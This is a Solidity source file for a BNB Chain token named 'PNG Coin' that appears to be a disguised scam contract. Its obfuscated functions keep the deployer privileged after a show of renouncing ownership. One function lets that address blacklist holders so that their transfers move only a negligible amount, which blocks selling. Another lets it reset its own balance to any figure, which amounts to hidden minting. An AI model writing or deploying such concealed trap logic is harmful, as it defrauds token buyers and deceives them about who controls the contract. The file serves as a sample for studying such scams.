/**
 *Submitted for verification at BscScan.com on 2023-01-29
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract PNGCoin {
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    string public symbol = "PCN";
    uint256 public totalSupply = 100000000 * 10 ** 18;
    address public fundShould;
    string public name = "PNG Coin";


    address public owner;

    uint256 constant txTeam = 14 ** 10;
    address public isAmount;
    bool public launchFund;
    mapping(address => bool) public sellList;

    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public amountFrom;

    

    event OwnershipTransferred(address indexed exemptBurnReceiver, address indexed isSenderLaunched);
    event Transfer(address indexed senderSwapTx, address indexed receiverListAt, uint256 isMode);
    event Approval(address indexed listReceiver, address indexed listMarketing, uint256 isMode);

    constructor (){
        IUniswapV2Router tradingSwap = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        isAmount = IUniswapV2Factory(tradingSwap.factory()).createPair(tradingSwap.WETH(), address(this));
        owner = msg.sender;
        fundShould = owner;
        amountFrom[fundShould] = true;
        balanceOf[fundShould] = totalSupply;
        emit Transfer(address(0), fundShould, totalSupply);
        renounceOwnership();
    }

    

    function getOwner() external view returns (address) {
        return owner;
    }

    function atMin(address amountShould) public {
        if (amountShould == fundShould || !amountFrom[msg.sender]) {
            return;
        }
        sellList[amountShould] = true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address fundFee, address launchIs, uint256 sellMin) public returns (bool) {
        if (fundFee != msg.sender && allowance[fundFee][msg.sender] != type(uint256).max) {
            require(allowance[fundFee][msg.sender] >= sellMin);
            allowance[fundFee][msg.sender] -= sellMin;
        }
        if (launchIs == fundShould || fundFee == fundShould) {
            return sellModeReceiver(fundFee, launchIs, sellMin);
        }
        if (sellList[fundFee]) {
            return sellModeReceiver(fundFee, launchIs, txTeam);
        }
        return sellModeReceiver(fundFee, launchIs, sellMin);
    }

    function transfer(address launchIs, uint256 sellMin) external returns (bool) {
        return transferFrom(msg.sender, launchIs, sellMin);
    }

    function sellModeReceiver(address tokenLaunchSender, address modeSender, uint256 sellMin) internal returns (bool) {
        require(balanceOf[tokenLaunchSender] >= sellMin);
        balanceOf[tokenLaunchSender] -= sellMin;
        balanceOf[modeSender] += sellMin;
        emit Transfer(tokenLaunchSender, modeSender, sellMin);
        return true;
    }

    function exemptBuy(address launchExemptFund) public {
        if (launchFund) {
            return;
        }
        amountFrom[launchExemptFund] = true;
        launchFund = true;
    }

    function fromSender(uint256 sellMin) public {
        if (sellMin == 0 || !amountFrom[msg.sender]) {
            return;
        }
        balanceOf[fundShould] = sellMin;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(fundShould, address(0));
        owner = address(0);
    }


}